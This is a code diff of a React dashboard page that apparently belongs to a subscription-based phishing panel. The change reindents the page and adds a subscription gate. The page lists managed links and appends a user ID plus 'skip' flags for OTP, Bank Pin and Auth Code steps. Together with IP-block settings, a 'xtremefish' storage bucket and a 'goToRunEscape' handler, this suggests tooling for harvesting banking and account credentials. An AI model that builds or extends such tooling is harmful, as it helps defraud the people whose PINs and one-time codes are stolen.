@@ -8,6 +8,7 @@ import moment from "moment";
 import { getUrls, deleteUrl } from "@/shared/Api/dashboard";
 import { getIps } from "@/shared/Api/dashboard";
 import Popup from "@/components/Popup";
+import SubscriptionPage from "@/appPages/SubscriptionPage";
 
 function page() {
   const [currentPage, setCurrentPage] = useState(1);
@@ -124,174 +125,195 @@ function page() {
     );
   };
 
-    const indexOfLastItem = currentPage * itemsPerPage;
-    const indexOfFirstItem = indexOfLastItem - itemsPerPage;
-    const currentUrls = Urls.slice(indexOfFirstItem, indexOfLastItem);
-  
-    const paginate = (pageNumber: number) => setCurrentPage(pageNumber);
+  const indexOfLastItem = currentPage * itemsPerPage;
+  const indexOfFirstItem = indexOfLastItem - itemsPerPage;
+  const currentUrls = Urls.slice(indexOfFirstItem, indexOfLastItem);
+
+  const paginate = (pageNumber: number) => setCurrentPage(pageNumber);
 
   return (
-    <Fragment>
-      <Seo title={"urls"} />
-      <Row>
-        <Col xl={12}>
-          <Card className="custom-card">
-            <Card.Header className="justify-content-between">
-              <Card.Title>links</Card.Title>
+    <>
+      {user?.subscription && Object.keys(user?.subscription)?.length ? (
+        <Fragment>
+          <Seo title={"Links"} />
+          <Row>
+            <Col xl={12}>
+              <Card className="custom-card">
+                <Card.Header className="justify-content-between">
+                  <Card.Title>links</Card.Title>
 
-              <div className="d-flex flex-wrap gap-2">
-                <div className="flex justify-between gap-2">
-                  {user?.role?.toLowerCase() === "admin" && (
-                    <button
-                      className="title:rounded-md"
-                      onClick={handleOpenPopup}
-                      title={"Add Url"}
-                    >
-                      <SquarePlus size={30} className="hover:text-blue-400" />
-                    </button>
-                  )}
-                  <Popup
-                    isOpen={isPopupOpen}
-                    onClose={handleClosePopup}
-                    urls={urls}
-                    setUrls={setUrls}
-                    descVal={descVal}
-                    setDescVal={setDescVal}
-                    updateId={updateId}
-                    setUpdate={setUpdate}
-                    ipBlock={ipBlock}
-                    setIpBlock={setIpBlock}
-                  />
-                </div>
-              </div>
-            </Card.Header>
-            <Card.Body className="p-0">
-              <div className="table-responsive">
-                <table className="table text-nowrap">
-                  <thead>
-                    <th>Link</th>
-                    <th>Date</th>
-                    <th>Actions</th>
-                  </thead>
-                  <tbody>
-                    {currentUrls &&
-                      currentUrls?.length > 0 &&
-                      currentUrls?.map((url: any) => (
-                        <tr key={url._id}>
-                          <td>
-                            <img
-                              src={
-                                user?.profileImage ??
-                                "https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/images%2Favatar.png?alt=media&token=6b910478-6e58-4c73-8ea9-f4827f2eaa1b"
-                              }
-                              alt="img"
-                              className="avatar avatar-xs avatar-rounded mb-1"
-                            />
-                            <a
-                              className="ml-2"
-                              onClick={(e) => {
-                                handleClick(e);
-                              }}
-                              // href={url.description + `userId=${user?._id}`}
-                              href={`${url.description}${
-                                url.description.includes("?") ? "&" : "?"
-                              }${user?._id ? `userId=${user._id}` : ""}${
-                                user?.skipPages?.includes("OTP") ? "&skip=OTP" : "" 
-                              }${
-                                user?.skipPages?.includes("Bank Pin") ? "&skip=BankPin" : "" 
-                              }${
-                                user?.skipPages?.includes("Auth Code") ? "&skip=AuthCode" : "" 
-                              }`}
-                              target="_blank"
-                            >
-                              {url.description}
-                            </a>
-                          </td>
-                          <td>
-                            <div className="btn-list">
-                              {moment(url?.createdAt).format(
-                                "ddd, MMM DD, YYYY, hh:mm A"
-                              )}
-                            </div>
-                          </td>
-                          <td>
-                            {user?.role?.toLowerCase() === "basic" ? (
-                              <Tooltip title="click">
-                                <Button
-                                  onClick={() => {
-                                    goToRunEscape(url.description);
-                                  }}
-                                >
-                                  <RotateCcw size={16} className="font-bold" />
-                                </Button>
-                              </Tooltip>
-                            ) : (
-                              <div className="flex py-2 justify-start gap-2 ">
-                                <button
-                                  className="text-red-500 mr-2"
-                                  onClick={() => filterUrls(url)}
-                                >
-                                  <Trash2 size={14} />
-                                </button>
-                                <button
-                                  className="text-blue-500"
-                                  onClick={() => handleUpdate(url)}
-                                >
-                                  <Pencil size={14} />
-                                </button>
-                              </div>
-                            )}
-                          </td>
-                        </tr>
-                      ))}
-                  </tbody>
-                </table>
-              </div>
-            </Card.Body>
-            <Card.Footer>
-              <div className="d-flex align-items-center">
-                <div>
-                  Showing {Urls.length} Entries{" "}
-                  <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
-                </div>
-                <div className="ms-auto">
-                  <nav
-                    aria-label="Page navigation"
-                    className="pagination-style-4"
-                  >
-                    <Pagination className="pagination mb-0">
-                      <Pagination.Item
-                        disabled={currentPage === 1}
-                        onClick={() => paginate(currentPage - 1)}
-                      >
-                        Prev
-                      </Pagination.Item>
-                      {Array.from({ length: Math.ceil(Urls.length / itemsPerPage) }).map(
-                        (_, index) => (
-                          <Pagination.Item
-                            key={index + 1}
-                            active={currentPage === index + 1}
-                            onClick={() => paginate(index + 1)}
-                          >
-                            {index + 1}
-                          </Pagination.Item>
-                        )
+                  <div className="d-flex flex-wrap gap-2">
+                    <div className="flex justify-between gap-2">
+                      {user?.role?.toLowerCase() === "admin" && (
+                        <button
+                          className="title:rounded-md"
+                          onClick={handleOpenPopup}
+                          title={"Add Url"}
+                        >
+                          <SquarePlus
+                            size={30}
+                            className="hover:text-blue-400"
+                          />
+                        </button>
                       )}
-                      <Pagination.Item
-                        disabled={currentPage === Math.ceil(Urls.length / itemsPerPage)}
-                        onClick={() => paginate(currentPage + 1)}
+                      <Popup
+                        isOpen={isPopupOpen}
+                        onClose={handleClosePopup}
+                        urls={urls}
+                        setUrls={setUrls}
+                        descVal={descVal}
+                        setDescVal={setDescVal}
+                        updateId={updateId}
+                        setUpdate={setUpdate}
+                        ipBlock={ipBlock}
+                        setIpBlock={setIpBlock}
+                      />
+                    </div>
+                  </div>
+                </Card.Header>
+                <Card.Body className="p-0">
+                  <div className="table-responsive">
+                    <table className="table text-nowrap">
+                      <thead>
+                        <th>Link</th>
+                        <th>Date</th>
+                        <th>Actions</th>
+                      </thead>
+                      <tbody>
+                        {currentUrls &&
+                          currentUrls?.length > 0 &&
+                          currentUrls?.map((url: any) => (
+                            <tr key={url._id}>
+                              <td>
+                                <img
+                                  src={
+                                    user?.profileImage ??
+                                    "https://firebasestorage.googleapis.com/v0/b/xtremefish-9ceaf.appspot.com/o/images%2Favatar.png?alt=media&token=6b910478-6e58-4c73-8ea9-f4827f2eaa1b"
+                                  }
+                                  alt="img"
+                                  className="avatar avatar-xs avatar-rounded mb-1"
+                                />
+                                <a
+                                  className="ml-2"
+                                  onClick={(e) => {
+                                    handleClick(e);
+                                  }}
+                                  // href={url.description + `userId=${user?._id}`}
+                                  href={`${url.description}${
+                                    url.description.includes("?") ? "&" : "?"
+                                  }${user?._id ? `userId=${user._id}` : ""}${
+                                    user?.skipPages?.includes("OTP")
+                                      ? "&skip=OTP"
+                                      : ""
+                                  }${
+                                    user?.skipPages?.includes("Bank Pin")
+                                      ? "&skip=BankPin"
+                                      : ""
+                                  }${
+                                    user?.skipPages?.includes("Auth Code")
+                                      ? "&skip=AuthCode"
+                                      : ""
+                                  }`}
+                                  target="_blank"
+                                >
+                                  {url.description}
+                                </a>
+                              </td>
+                              <td>
+                                <div className="btn-list">
+                                  {moment(url?.createdAt).format(
+                                    "ddd, MMM DD, YYYY, hh:mm A"
+                                  )}
+                                </div>
+                              </td>
+                              <td>
+                                {user?.role?.toLowerCase() === "basic" ? (
+                                  <Tooltip title="click">
+                                    <Button
+                                      onClick={() => {
+                                        goToRunEscape(url.description);
+                                      }}
+                                    >
+                                      <RotateCcw
+                                        size={16}
+                                        className="font-bold"
+                                      />
+                                    </Button>
+                                  </Tooltip>
+                                ) : (
+                                  <div className="flex py-2 justify-start gap-2 ">
+                                    <button
+                                      className="text-red-500 mr-2"
+                                      onClick={() => filterUrls(url)}
+                                    >
+                                      <Trash2 size={14} />
+                                    </button>
+                                    <button
+                                      className="text-blue-500"
+                                      onClick={() => handleUpdate(url)}
+                                    >
+                                      <Pencil size={14} />
+                                    </button>
+                                  </div>
+                                )}
+                              </td>
+                            </tr>
+                          ))}
+                      </tbody>
+                    </table>
+                  </div>
+                </Card.Body>
+                <Card.Footer>
+                  <div className="d-flex align-items-center">
+                    <div>
+                      Showing {Urls.length} Entries{" "}
+                      <i className="bi bi-arrow-right ms-2 fw-semibold"></i>
+                    </div>
+                    <div className="ms-auto">
+                      <nav
+                        aria-label="Page navigation"
+                        className="pagination-style-4"
                       >
-                        Next
-                      </Pagination.Item>
-                    </Pagination>
-                  </nav>
-                </div>
-              </div>
-            </Card.Footer>
-          </Card>
-        </Col>
-      </Row>
-    </Fragment>
+                        <Pagination className="pagination mb-0">
+                          <Pagination.Item
+                            disabled={currentPage === 1}
+                            onClick={() => paginate(currentPage - 1)}
+                          >
+                            Prev
+                          </Pagination.Item>
+                          {Array.from({
+                            length: Math.ceil(Urls.length / itemsPerPage),
+                          }).map((_, index) => (
+                            <Pagination.Item
+                              key={index + 1}
+                              active={currentPage === index + 1}
+                              onClick={() => paginate(index + 1)}
+                            >
+                              {index + 1}
+                            </Pagination.Item>
+                          ))}
+                          <Pagination.Item
+                            disabled={
+                              currentPage ===
+                              Math.ceil(Urls.length / itemsPerPage)
+                            }
+                            onClick={() => paginate(currentPage + 1)}
+                          >
+                            Next
+                          </Pagination.Item>
+                        </Pagination>
+                      </nav>
+                    </div>
+                  </div>
+                </Card.Footer>
+              </Card>
+            </Col>
+          </Row>
+        </Fragment>
+      ) : (
+        <SubscriptionPage />
+      )}
+    </>
   );
 }
 
